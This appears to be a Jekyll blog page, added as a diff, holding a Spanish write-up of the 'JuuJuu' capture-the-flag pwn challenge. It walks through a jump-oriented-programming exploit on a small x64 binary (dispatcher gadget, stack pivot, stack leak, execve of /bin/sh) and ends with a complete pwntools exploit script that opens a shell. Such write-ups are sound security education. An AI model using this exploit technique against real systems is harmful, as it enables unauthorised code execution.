@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>WRITEUP, JuuJuu, PWNDAY#01 soluciones | Your awesome title</title>
+<meta name="generator" content="Jekyll v3.8.5" />
+<meta property="og:title" content="WRITEUP, JuuJuu, PWNDAY#01 soluciones" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Hace un tiempo el gran c4e me mostró un challenge que había preparado, el cual me gusto tanto que nos motivamos a hacer PWNDAY#01, donde hicimos algunos challenge pwn con diferentes dificultades, (básico-intermedio-pro), el nivel pro fue un reto de c4e que antes de lanzarlo obviamente me invito a que solucionara para ver la dificultad, el reto me costo MUCHO, me tomo mas de 18 horas solucionarlo parcializado en varios días (pero por que soy un un n00b :D, y bueno también porque nunca había utilizado JOP)" />
+<meta property="og:description" content="Hace un tiempo el gran c4e me mostró un challenge que había preparado, el cual me gusto tanto que nos motivamos a hacer PWNDAY#01, donde hicimos algunos challenge pwn con diferentes dificultades, (básico-intermedio-pro), el nivel pro fue un reto de c4e que antes de lanzarlo obviamente me invito a que solucionara para ver la dificultad, el reto me costo MUCHO, me tomo mas de 18 horas solucionarlo parcializado en varios días (pero por que soy un un n00b :D, y bueno también porque nunca había utilizado JOP)" />
+<link rel="canonical" href="http://localhost:4000/sin%20categor%C3%ADa/2020/05/23/writeup-juujuu-pwnday01-soluciones.html" />
+<meta property="og:url" content="http://localhost:4000/sin%20categor%C3%ADa/2020/05/23/writeup-juujuu-pwnday01-soluciones.html" />
+<meta property="og:site_name" content="Your awesome title" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-05-23T22:11:00-04:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="WRITEUP, JuuJuu, PWNDAY#01 soluciones" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","url":"http://localhost:4000/sin%20categor%C3%ADa/2020/05/23/writeup-juujuu-pwnday01-soluciones.html","headline":"WRITEUP, JuuJuu, PWNDAY#01 soluciones","dateModified":"2020-05-23T22:11:00-04:00","datePublished":"2020-05-23T22:11:00-04:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/sin%20categor%C3%ADa/2020/05/23/writeup-juujuu-pwnday01-soluciones.html"},"description":"Hace un tiempo el gran c4e me mostró un challenge que había preparado, el cual me gusto tanto que nos motivamos a hacer PWNDAY#01, donde hicimos algunos challenge pwn con diferentes dificultades, (básico-intermedio-pro), el nivel pro fue un reto de c4e que antes de lanzarlo obviamente me invito a que solucionara para ver la dificultad, el reto me costo MUCHO, me tomo mas de 18 horas solucionarlo parcializado en varios días (pero por que soy un un n00b :D, y bueno también porque nunca había utilizado JOP)","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Your awesome title" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Your awesome title</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">WRITEUP, JuuJuu, PWNDAY#01 soluciones</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2020-05-23T22:11:00-04:00" itemprop="datePublished">May 23, 2020
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <!-- wp:paragraph -->
+<p>Hace un tiempo el gran <a href="https://c4ebt.github.io/"><strong>c4e</strong></a><strong> </strong>me mostró un challenge que había preparado, el cual me gusto tanto que nos motivamos a hacer PWNDAY#01, donde hicimos algunos challenge pwn con diferentes dificultades, (básico-intermedio-pro), el nivel pro fue un reto de <a href="https://c4ebt.github.io/"><strong>c4e</strong></a><strong> </strong>que antes de lanzarlo obviamente me invito a que solucionara para ver la dificultad, el reto me costo MUCHO, me tomo mas de 18 horas solucionarlo parcializado en varios días (pero por que soy un un n00b :D,  y bueno también porque nunca había utilizado JOP)<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>JOP o Jump Oriented Programming, es una técnica basada en ROP de la cual ya he hablado en este blog, pero en vez de usar un ret al final, usamos instrucciones de salto o JMP para volver a parte controlada del código con gadgets llamados dispatchers, para aprender más sobre JOP, acá hay un <a href="https://www.comp.nus.edu.sg/~liangzk/papers/asiaccs11.pdf"><strong>paper </strong></a>que explica bastante bien todo.<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Primero comenzamos debugeando el binario, el cual podemos ver es un ejecutable x64<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh6.googleusercontent.com/d6Q0oGMfS-PO77AAuhXj_bDjisXHOyuL2WvirnjpnI6bCNhbdGx3ID_igKxv0ZRXNPv9BoymjTU0tjCM2PNkD61x6Bfb1shCVn5AaU2oKjhKTOX4CdDCUwuYyzXeyBQFDHuh_3Wr" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Observamos las protecciones del binario usando <a href="https://github.com/slimm609/checksec.sh">checksec</a><br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh3.googleusercontent.com/kUjY_aEuVv_rX8Qk50Fv_tn_cAysA1PV5lxD0oVXMfeDEb-ubnIdsjBMQ59XdZasVfVXBmO5ukWhBeNBlv3WGalFkCU_mWJfS8B0xdwR1ZNCoEdN7vTaJ1M6BFF3PtVjY01uFnsZ" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Las direcciones del binario se mantendrán debido al “flag” de “no-pie” esto nos será de ayuda ya que no debemos bypassear aslr usando gadgets dentro del binario, al observar el programa vemos que es bastante pequeno, escrtito en assembler, y con solo una funcion que lee</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh4.googleusercontent.com/0kaKbB3JMAlNESHFraL0R2JMDyIcFUsfu9ERXa_v4MjKlQ45he6vXNH5ZkUuhWWiQDUHVTRaeXJwqRViwWYXjLmuvPE5Y1AtZT0tXeikVgDiTjIl-hqcP7Ifi_mN65MkQQrPqalc" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Ademas ya podemos observar que no hay aparentes instrucciones ret lo cual podemos comprobar ejecutando ropper y/o objdump</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Además todos los saltos son a registros “dereference” ([reg]), por lo cual no podemos hacer, por ejemplo, un pop RCX y luego saltar a RCX, ya que el salto será a [RCX], por lo cual debemos ver la forma de filtrar alguna direccion del stack para poder calcular los offsets a cada registro.<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Para nuestra suerte tenemos un primer gadget que podemos usar como dispatcher y es la dirección 4000c7, la cual suma 8 a RSP y luego salta al dereference de RSP-0x8 por tanto nos permitirá saltar a la dirección que pongamos antes en nuestro payload, por lo que la enviaremos de la siguiente forma:<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh3.googleusercontent.com/F9dYG3ZVDfsbgMbngSVOlZ3jcO7bJWki760g4WTijbBFs8SEzf-64e5pcQEjV1Zv-OepNs1gDlp_h7pV6gPHIATpkzsmuJenBnSc0EJsMhulp1KCBzr4FR755cBDazLU29r3rJns" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Usamos la direccion 4000d4 como salto ya que dicha dirección contiene un push de RSP que empujara la dirección de RSP al stack y nos permitirá controlar el salto a RCX ya que RCX contendrá la dirección del stack donde se encuentra ADD RSP + 8 ; JMP [rsp-0x8]<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh3.googleusercontent.com/Y8O0LSbcwXYc4szVnE4RolzZlBhukS0e2OS2h1UUfdseLoHFRLVUXHDchdBo00pIYGxdALhS2MKi4wdA1jhVKZHpebRgDlAscHHOJirhg23PWfg8DycDSL-vp_6j22-KWeA73Odo" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Con esto ya podemos setear nuestro dispatcher en [RCX]&nbsp; y aprovechando el vuelo usando los gadgets lo seteamos a RBP y r10 (ya que el código lo permite). Ahora cualquier instrucción que pongamos se ejecutará, siempre cuando tenga un salto a [RCX]. [RBP] o [r10]<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Ahora nos topamos con otro obstáculo! El stack es muy pequeño, qué podemos hacer? Pivotear!, pues para eso usaremos la instrucción en 400131 la cual le resta 0x100 al stack con esto haremos un salto atrasa 32 bytes de nuestro salto inicial<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Seteamos el dispatcher nuevamente a RCX y ahora ejecutamos el syscall de write, para que write? Pues dado que no tenemos idea de donde encontrar nuestro stack para poder hacer una llamada a los registros sin tener que forzosamente dar cero a RAX (otro problema), pues debemos lekear una dirección del stack, para esto usaremos write y escribiremos el leak al stdout para leerlo. Con esto el programa se ejecutara de nuevo, pero esta vez tendremos la dirección del stack a nuestro alcance para hacer los cálculos de gadgets correspondientes</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh6.googleusercontent.com/cBSsS9AVRUBSYndiDIdGjS0v5McYASHa56xbTweIjzyG3FUd7X3QKaA8yI94IvlYStMiDjGQoYKNotT2kPj_C1X1mXTFbD1jt4rkG11WB4os3r7h2ZclZtUWW9QCTBPOynhLtfBM" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Perfecto ya con este leak podemos comenzar a preparar nuevamente el exploit repitiendo los primeros pasos pero esta vez en vez de llamar a write, jugaremos con los valores de los registros para poder llamar a execve() con el offset desde nuestro leak al string de /bin/sh que enviaremos al comienzo del payload<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image -->
+<figure class="wp-block-image"><img src="https://lh4.googleusercontent.com/Vz3Yx0E-cTm9H9vsDHSqP821bBOOLmM_IHnLHAEbFj5u4dn9vegw4aJmMYE7hMU0HxiSkJnFvAuf-Xuo8cT9hPlEQhtf0LbpdQQ_e5oSlVykw2t2g_7LfJ0HKQMS4TiXd84u7e8d" alt="" /></figure>
+<!-- /wp:image -->
+
+<!-- wp:paragraph -->
+<p>Perfecto y ejecutamos y SHELL<br /></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Disfrute mucho este reto, siento que cuando uno se ve atrapado es cuando uno más aprende, de verdad felicitaciones nuevamente al creador del reto. EL resto de solucioens pueden verlas en mi github</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p><a href="https://github.com/dplastico/pwnday01">https://github.com/dplastico/pwnday01</a></p>
+<!-- /wp:paragraph -->
+
+<!-- wp:paragraph -->
+<p>Aca les dejo el exploit final:</p>
+<!-- /wp:paragraph -->
+
+<!-- wp:code -->
+<pre class="wp-block-code"><code>from pwn import *
+
+#0x4000c5 syscall
+#offset 2 24
+r = process('./juujuu')
+#gdb.attach(r)
+#r = remote('159.89.45.52', 5555)
+empezando = "/bin/sh\0" #controlamos este registro, rsi
+
+#stage 1
+#------------------------------------------------------------#
+#construyendo salto atras
+jop = "A" * 24
+#saltando a rsp +8 , [rsp-8]
+jop += p64(0x4000d4)
+jop += p64(0x4000c7)
+#write syscall para hacer un leak del stack
+jop += p64(0x4000fc)
+jop += p64(0x004000b0)
+
+junk = "A" * (cyclic_find('qaac')-len(empezando)-8-len(jop))                        
+payload = empezando                                                               
+payload += jop                                                                      
+payload += junk
+
+#seteando [rcx] a dispatcher                                                    
+payload += p64(0x4000d4)                                                   
+payload += p64(0x4000c7)
+
+#[rbp] a dispatcher
+payload += p64(0x00000000004000cf)
+
+#setear r10 a dispatcher, por que si no mas
+payload += p64(0x4000ec)
+
+#mas stack (pivot)                                                      
+payload += p64(0x0000000000400131)#sub rsp 100                                  
+r.sendline(payload)
+
+#--------------------------------------------------------#
+
+#stage2
+#recibiendo leak del stack
+resp = u64(r.recv(8))
+print "LEAK  STACK  :   ",hex(resp)
+
+#seteando salto atras para syscall final execve()
+jop2 = "A" * 32
+#
+jop2 += p64(0x4000de) #inc RAX
+jop2 += p64(resp)#restaurando rcx
+jop2 += p64(0x4000de) #inc RAX
+jop2 += p64(resp)#restaurando rcx
+jop2 += p64(0x4000de) #inc RAX
+jop2 += p64(resp)#restaurando rcx
+jop2 += p64(0x400108)#add rax 12
+jop2 += p64(0x400108)#add rax 12
+jop2 += p64(0x400108)#add rax 12
+jop2 += p64(0x400125)
+jop2 += p64(resp-0x1c8) #address the bin sh enviada esta 0x1c8 del leak de stack
+jop2 += p64(0x40011b)# xor los otros reg
+jop2 += p64(resp)
+jop2 += p64(0x400101) #syscall
+
+junk = "A" * (cyclic_find('qaac')-len(empezando)-8-len(jop2))                                             
+payload2 = empezando  #/bin/sh                                                               
+payload2 += jop2                                                                     
+payload2 += junk
+#seteando [rcx] a dispatcher                                                   
+payload2 += p64(0x4000d5) #rax a 0x0 y luego a 0x1                                                  
+payload2 += p64(resp)#restaurando rcx
+payload2 += p64(0x4000de) #inc RAX
+payload2 += p64(resp)#restaurando rcx
+#ganando stack
+payload2 += p64(0x0000000000400131)#sub rsp 100                                            
+r.sendline(payload2)
+
+r.interactive()
+</code></pre>
+<!-- /wp:code -->
+
+  </div><a class="u-url" href="/sin%20categor%C3%ADa/2020/05/23/writeup-juujuu-pwnday01-soluciones.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Your awesome title</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Your awesome title</li><li><a class="u-email" href="mailto:your-email@example.com">your-email@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
